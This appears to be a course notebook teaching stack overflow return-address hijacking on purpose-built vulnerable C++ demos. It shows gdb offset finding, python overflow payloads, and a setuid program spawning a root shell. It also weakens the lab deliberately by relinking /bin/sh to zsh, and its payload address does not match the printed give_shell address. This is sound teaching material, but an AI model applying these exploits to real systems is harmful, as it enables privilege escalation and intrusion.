## Stack Overflow - Execution Flow Corruption
- overrun in stack segment may lead to corruption in execution flow of the program
- violates the integrity of the program itself

## program execution flow corruption demo
- stack overflow may lead to memory corruption which may lead to the corruption of execution flow
- we saw a simple demonstration in memory corruption chapter that memory corrpution can change the unintentional flow of the program where attackers could authenticate without knowing the correct password!
- we'll take a step further in this notebook where you'll see that flow of the program can be also be changed by overwriting the caller's return address with the address of attacker's choice 

## Execution flow with function call
- when a caller calls a function, program execution enters the function and executes each line of code inside function
- callee function must return back the execution to its caller once it's done executing
- caller pushes return address to the callee's stack, so the callee knows where to return to and continue execution in caller

### overwrite the caller's return address
- what if the buffer is overflown to corrupt the caller's return address with something else?
- if the return address is not valid, program will segfault
- if the return address is a valid one, program will execute the code in that controlled return address!

### return to the function/code of user's choice
- this technique is fairly straigtforward and just works!
- find the address of the function of your choice in the program and overwrite the caller's return address to the controlled function's address
- let's use `authenticate3.cpp` program as demonstrataion
- parts of the same `authenticate.cpp` program are moved to functions for the demonstration purpose


```python
! pwd
```


```python
%cd ../demos/stack_overflow
```


```python
! cat authenticate3.cpp
```

    #include <cstring>
    #include <iostream>
    #include <cstdlib>
    
    using namespace std;
    
    void valid() {
        cout << "\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n";
        cout << "      Access Granted.\n";
        cout << "-=-=-=-=-=-=-=-=-=-=-=-=-=-\n";
    }
    
    void invalid() {
        cout << "\nAccess Denied.\n";
        cout << "Try again...\n";
    }
    
    int check_authentication(char *password) {
        char password_buffer[16];
    
        strcpy(password_buffer, password);
    
        if(strcmp(password_buffer, "brillig") == 0)
            return true;
        if(strcmp(password_buffer, "outgrabe") == 0)
            return true;
    
        return false;
    }
    
    int main(int argc, char *argv[]) {
        if(argc < 2) {
            cout << "Usage: " << argv[0] << " password\n";
            exit(0);
        }
        if(check_authentication(argv[1]))
            valid();
        else
            invalid();
            
        return 0;
    }


```bash
%%bash
input="authenticate3.cpp"
output="authenticate3.exe"
echo kali | sudo -S ../compile.sh $input $output
```

    [sudo] password for kali: 


```python
! ./authenticate3.exe $(python -c 'print("A"*17)')
# no auth_flag to overflow, access not granted!
```

    
    Access Denied.
    Try again...



```python
! ./authenticate3.exe $(python -c 'print("A"*100)')
# segfault! see on terminal
```

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./authenticate3.exe $(python -c 'print("A"*100)')~                                                           1 ⨯
zsh: segmentation fault  ./authenticate3.exe $(python -c 'print("A"*100)')~
```

## Program execution and return address

- let's load the program in gdb to examine memory address, esp. the caller's return address

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ gdb -q authenticate3.exe                                                              
Reading symbols from authenticate3.exe...
```

- let's set at check_authentication function

```bash
Reading symbols from authenticate3.exe...
gdb-peda$ break check_authentication(char*) 
Breakpoint 1 at 0x8049271: file ./demos/stack_overflow/authenticate3.cpp, line 20.
```

- let's run the program with 100 junk bytes (100 A's will do it!) as argument
- junk must be large enough to overwrite the return address
- let's try with 100 bytes; should be more than enough to overflow 16 bytes password buffer and the return address

```bash
gdb-peda$ run $(python -c 'print("A"*100)')

Starting program: /home/kali/EthicalHacking/authenticate3.exe $(python -c 'print("A"*100)')
[----------------------------------registers-----------------------------------]
EAX: 0xffffc67b ('A' <repeats 100 times>)
EBX: 0x804c000 --> 0x804bf04 --> 0x1 
ECX: 0xffffc350 --> 0x2 
EDX: 0xffffc384 --> 0x0 
ESI: 0xffffc350 --> 0x2 
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0xffffc308 --> 0xffffc338 --> 0x0 
ESP: 0xffffc2f0 --> 0x0 
EIP: 0x8049271 (<_Z20check_authenticationPc+18>:        sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049263 <_Z20check_authenticationPc+4>:    sub    esp,0x14
   0x8049266 <_Z20check_authenticationPc+7>:    call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x804926b <_Z20check_authenticationPc+12>:   add    ebx,0x2d95
=> 0x8049271 <_Z20check_authenticationPc+18>:   sub    esp,0x8
   0x8049274 <_Z20check_authenticationPc+21>:   push   DWORD PTR [ebp+0x8]
   0x8049277 <_Z20check_authenticationPc+24>:   lea    eax,[ebp-0x18]
   0x804927a <_Z20check_authenticationPc+27>:   push   eax
   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffc2f0 --> 0x0 
0004| 0xffffc2f4 --> 0x2 
0008| 0xffffc2f8 --> 0xffffc318 --> 0x804c000 --> 0x804bf04 --> 0x1 
0012| 0xffffc2fc --> 0x80493ed (<_GLOBAL__sub_I__Z5validv()+31>:        add    esp,0x10)
0016| 0xffffc300 --> 0x1 
0020| 0xffffc304 --> 0x804c000 --> 0x804bf04 --> 0x1 
0024| 0xffffc308 --> 0xffffc338 --> 0x0 
0028| 0xffffc30c --> 0x804934d (<main(int, char**)+126>:        add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, check_authentication (password=0xffffc67b 'A' <repeats 100 times>)
    at ./demos/stack_overflow/authenticate3.cpp:20
20          strcpy(password_buffer, password);
```

- enter next or n to execute next instruction; keep entering next and stop when the instruction: **strcpy(password_buffer, password);** is exectued
- the **password** passed to the function will have been copied to **password_buffer** local variable

```bash
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffc2f0 ('A' <repeats 100 times>)
EBX: 0x804c000 --> 0x804bf04 --> 0x1 
ECX: 0xffffc6d0 ('A' <repeats 15 times>)
EDX: 0xffffc345 ('A' <repeats 15 times>)
ESI: 0xffffc350 ("AAAA")
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0xffffc308 ('A' <repeats 76 times>)
ESP: 0xffffc2f0 ('A' <repeats 100 times>)
EIP: 0x8049283 (<_Z20check_authenticationPc+36>:        sub    esp,0x8)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804927a <_Z20check_authenticationPc+27>:   push   eax
   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>
   0x8049280 <_Z20check_authenticationPc+33>:   add    esp,0x10
=> 0x8049283 <_Z20check_authenticationPc+36>:   sub    esp,0x8
   0x8049286 <_Z20check_authenticationPc+39>:   lea    eax,[ebx-0x1f86]
   0x804928c <_Z20check_authenticationPc+45>:   push   eax
   0x804928d <_Z20check_authenticationPc+46>:   lea    eax,[ebp-0x18]
   0x8049290 <_Z20check_authenticationPc+49>:   push   eax
[------------------------------------stack-------------------------------------]
0000| 0xffffc2f0 ('A' <repeats 100 times>)
0004| 0xffffc2f4 ('A' <repeats 96 times>)
0008| 0xffffc2f8 ('A' <repeats 92 times>)
0012| 0xffffc2fc ('A' <repeats 88 times>)
0016| 0xffffc300 ('A' <repeats 84 times>)
0020| 0xffffc304 ('A' <repeats 80 times>)
0024| 0xffffc308 ('A' <repeats 76 times>)
0028| 0xffffc30c ('A' <repeats 72 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
22          if(strcmp(password_buffer, "brillig") == 0)
```

- return address is always stored at EBP+4, so let's see that location

```bash
gdb-peda$ p $ebp+4
$1 = (void *) 0xffffc30c
```

- now the 100As are copied to the password_buffer, let's examine 40 word bytes from top of the stack
- 40w = 160 bytes that should display the location of caller's return address!
- notice a bunch of Ox41 = A that are stored in stack

```bash
gdb-peda$ x/40wx $esp
0xffffc2f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc300:     0x41414141      0x41414141      0x41414141      0x41414141 <- return address & 0xffffc30c
0xffffc310:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc320:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc330:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc340:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc350:     0x41414141      0xffffc300      0xffffc400      0xffffc384
0xffffc360:     0xffffc394      0xf7ffdb40      0xf7fcbd10      0xf7de6000
0xffffc370:     0x00000001      0x00000000      0xffffc3d8      0x00000000
0xffffc380:     0xf7ffd000      0x00000000      0xf7de6000      0xf7de6000
```
- let's continue to the end of the program with c command

```bash
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x6f ('o')
EDX: 0xffffc2f0 ('A' <repeats 100 times>)
ESI: 0xffffc350 ("AAAA")
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffc310 ('A' <repeats 68 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffc310 ('A' <repeats 68 times>)
0004| 0xffffc314 ('A' <repeats 64 times>)
0008| 0xffffc318 ('A' <repeats 60 times>)
0012| 0xffffc31c ('A' <repeats 56 times>)
0016| 0xffffc320 ('A' <repeats 52 times>)
0020| 0xffffc324 ('A' <repeats 48 times>)
0024| 0xffffc328 ('A' <repeats 44 times>)
0028| 0xffffc32c ('A' <repeats 40 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? () <--------------------- 0x41414141 == AAAA
```

- since the caller's return address (0xffffc30c) is overwritten with AAAA, program crashes with segfault

### Finding the offset

- knowing the exact offset will help us overwrite the caller's return address with our controlled return address
- let's use gdb-peda for this!

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ gdb -q authenticate3.exe                                 
Reading symbols from authenticate3.exe...
```

- create cyclic pattern of 100 bytes
- pattern should be large enough to overwrite the return address and crash the program
- we know that 100 bytes will do the job as demonstrated above!

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

- let's create and store the pattern as argument to the program

```bash
gdb-peda$ pattern arg 100
Set 1 arguments to program
```

- let's run the program with the cyclic pattern as argumen

```bash
gdb-peda$ run

Starting program: /home/kali/EthicalHacking/authenticate3.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41412d41 ('A-AA')
ECX: 0x6f ('o')
EDX: 0xffffc2f0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESI: 0xffffc350 ("6AAL")
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0x44414128 ('(AAD')
ESP: 0xffffc310 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffc310 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffc314 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffc318 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffc31c ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffc320 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffc324 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffc328 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffc32c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()
```

- program crashed!
- let's search the pattern for offset using `pattern search` command

```bash
gdb-peda$ patts  # pattern search

Registers contain pattern buffer:
EBX+0 found at offset: 20
EBP+0 found at offset: 24
EIP+0 found at offset: 28 <- !this is the offset! + 4b will overwrite return add
Registers point to pattern buffer:
[EDX] --> offset 0 - size ~100
[ESP] --> offset 32 - size ~68
[ESI] --> offset 96 - size ~4
Pattern buffer found at:
0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)
0xffffc2f0 : offset    0 - size  100 ($sp + -0x20 [-8 dwords])
0xffffc689 : offset    0 - size  100 ($sp + 0x379 [222 dwords])
References to pattern buffer found at:
0xf7e62d2c : 0xffffc2f0 (/usr/lib32/libstdc++.so.6.0.28)
0xffffc2d0 : 0xffffc2f0 ($sp + -0x40 [-16 dwords])
0xffffc2e0 : 0xffffc2f0 ($sp + -0x30 [-12 dwords])
0xffffc3f8 : 0xffffc689 ($sp + 0xe8 [58 dwords])
```

- let's run the program in gdb with 28 As + 4 Bs

```bash
gdb-peda$ run $(python -c 'print("A"*28+"BBBB")')

gdb-peda$ run $(python -c 'print("A"*28+"BBBB")')
Starting program: /home/kali/EthicalHacking/authenticate3.exe $(python -c 'print("A"*28+"BBBB")')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x6f ('o')
EDX: 0xffffc340 ('A' <repeats 28 times>, "BBBB")
ESI: 0xffffc3a0 --> 0x2 
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffc360 --> 0xffffc600 --> 0x4 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffc360 --> 0xffffc600 --> 0x4 
0004| 0xffffc364 --> 0xffffffff 
0008| 0xffffc368 --> 0x804c000 --> 0x804bf04 --> 0x1 
0012| 0xffffc36c --> 0x80492e7 (<main(int, char**)+24>: add    ebx,0x2d19)
0016| 0xffffc370 --> 0x2 
0020| 0xffffc374 --> 0xffffc444 --> 0xffffc693 ("/home/kali/EthicalHacking/authenticate3.exe")
0024| 0xffffc378 --> 0xffffc450 --> 0xffffc6e0 ("COLORFGBG=15;0")
0028| 0xffffc37c --> 0xffffc3a0 --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? () <----- BBBB can't return to the invalid BBBB address
```
- so we've determined that 28 bytes of junk will get us to the location where caller's return address is stored
- now instead of overwriting the return address with BBBB, how about we find some interesting functions' address!
- use **nm** to find the addresses of all the symbols


```python
! nm authenticate3.exe | grep valid
```

    08049196 T _Z5validv
    080491f9 T _Z7invalidv



```python
# how about **valid** function?
# must use: sys.stdout.buffer.write to print memory addresses and binary data!
! ./authenticate3.exe $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*28 + b"\x96\x91\x04\x08")')
```

    
    -=-=-=-=-=-=-=-=-=-=-=-=-=-
          Access Granted.
    -=-=-=-=-=-=-=-=-=-=-=-=-=-


- we forced the execution flow of the program to return to **valid()** and execute it instead of the **invalid()** for wrong password!

## One more example

- let's look at the `so_stdio.cpp` program that has a `give_shell()` function that's not called anywhere in the program
- when bad function is done executing, the program should execute cout statement in **main()** printing 'Good bye!'
- since, **bad()** has overflow vulnerability (can you see where?), we can overflow **buffer** and overwrite the caller's return address with the address of **give_shell()**
- let's see how we can achieve that

### Configuring /bin/sh

- in recent Linux, /bin/sh symbolic link points to the /bin/dash shell
- **dash** and **bash** programs have implemented security countermeasure that prevents itself from being executed in a Set-UID process
    - if they detect being run from Set-UID process, they will drop the effective user ID to the process's real user ID (essentially dropping the privilege)
- install **zsh** which Kali already comes with that doesn't have the countermeasure implemented
- create a soft link pointing `/bin/sh` to `/bin/zsh`

```bash
sudo ln -sf file linkName
sudo ln -sf /bin/zsh /bin/sh
```


```python
# let's see the link
! ls -al /bin/sh
```


```python
# let's see the file being pointed to
! ls -al /bin/zsh
```


```python
! cat ./demos/stack_overflow/so_stdio.cpp
```

 - let's compile the program and execute it
 - recall that the buffer's address doesn't change as long as the program name length is not changed and no argument is passed to the program


```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/demos/stack_overflow



```bash
%%bash
input="so_stdio.cpp"
output="so_stdio.exe"
echo kali | sudo -S ../compile.sh $input $output
```

    [sudo] password for kali: so_stdio.cpp: In function ‘char* mgets(char*)’:
    so_stdio.cpp:29:16: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       29 |         *ptr = ch;
          |                ^~
    so_stdio.cpp:35:20: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       35 |         *(++ptr) = ch;
          |                    ^~
    so_stdio.cpp: In function ‘int main(int, char**)’:
    so_stdio.cpp:51:14: warning: unused parameter ‘argc’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |          ~~~~^~~~
    so_stdio.cpp:51:26: warning: unused parameter ‘argv’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |                    ~~~~~~^~~~~~



```python
! python -c 'print("Hello World!"*20)' | ./so_stdio.exe
```


```python
# so_stdio.exe has root privilege
! ls -al so_stdio.exe
```


```python
# set effective userid as owner/root
! echo kali | sudo -S chmod 4755 so_stdio.exe
```


```python
# or use symbolic +s / -s
! echo kali | sudo -S chmod u+s so_stdio.exe
```


```python
! ls -al so_stdio.exe
```

### steps to exploit the so_stdio.exe to execute give_shell( )

1. find the offset of the return address with respective to the buffer
2. find the address of `give_shell()` symbol
3. send junk of offset length and the address of `give_shell()` to return to it
4. and voila!

#### step1: find the offset
- we'll use gdb-peda's cyclic pattern for this as shown below

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ gdb -q so_stdio.exe 
Readinexeg symbols from so_stdio.exe...

```

- let's create a pattern of 200 bytes (long enough) to overwrite the caller's return address and store it to a file
- since, the program gets the data interactively via std I/O, we'll pipe the data from the file when executing the program

```bash
gdb-peda$ pattern create 200 pattern.txt
Writing pattern of 200 chars to filename "pattern.txt"
```

- run the program with the pattern created as standard input

```bash

gdb-peda$ run < pattern.txt
Starting program: /home/kali/projects/SoftwareSecurity/so_stdio.exe < pattern.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
buffer is at 0xffffbd80
Give me some text: Acknowledged: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA with length 200

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0xf7e23c40 --> 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:     endbr32)
EBX: 0x41416b41 ('AkAA')
ECX: 0xf7a1e9b8 --> 0x0 
EDX: 0xf7e20970 --> 0xf7d1b8c0 (<_ZNSoD1Ev>:    endbr32)
ESI: 0x6c414150 ('PAAl')
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffbe10 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffbe10 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffbe14 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffbe18 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffbe1c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffbe20 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffbe24 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffbe28 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffbe2c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()

```

- let's search for the offset using pattern search in registers
- look for EIP+0 line for the offset of return address from the buffer


```bash
gdb-peda$ patts

Registers contain pattern buffer:
EBX+0 found at offset: 128
EBP+0 found at offset: 136
ESI+0 found at offset: 132
EIP+0 found at offset: 140 <<<<<<<----------- THE OFFSET WE NEED TO OVERFLOW RETURN ADDRESS !!!!!
Registers point to pattern buffer:
[ESP] --> offset 144 - size ~56
Pattern buffer found at:
0x08051bbe : offset    0 - size  200 ([heap])
0x08051fc0 : offset    0 - size  200 ([heap])
0xf7fa70b9 : offset 33208 - size    4 (/usr/lib32/libm.so.6)
0xffffbd80 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])
References to pattern buffer found at:
0xf7a1d624 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d628 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d62c : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d630 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d634 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d638 : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7a1d63c : 0x08051fc0 (/usr/lib32/libc.so.6)
0xf7c8b1d5 : 0xffffbd80 (/usr/lib32/libstdc++.so.6.0.30)
0xffffb8b8 : 0xffffbd80 ($sp + -0x558 [-342 dwords])
```

- so, the caller's return address is **140** bytes away from the buffer

#### step 2: find the address of give_shell()


```python
! nm so_stdio.exe | grep give_shell
```

    080491d6 T _Z10give_shellv


- look for a line that has *give_shell*
- the first column is the address of the symbols when the program is loaded in memory for execution
- now let's create the payload of 140 JUNK + [little endian address of give_shell] and send it to the program as shown below
- caveat: since the program takes data from STD IO, we need to create and store the payload into a file
- then cat and pipe the contents of the payload; 
- NOTE `-` hyphen after cat is required to get the interactive shell

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ python -c 'import sys; sys.stdout.buffer.write(b"A"*140 + b"\x12\x92\x04\x08")' > payload.bin

┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ cat payload.bin - | ./so_stdio.exe
buffer is at 0xffffbdd0
Give me some text: hello
Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhello with length 149
whoami
root
date
Mon Mar 27 02:16:06 PM EDT 2023
exit
```


```python

```
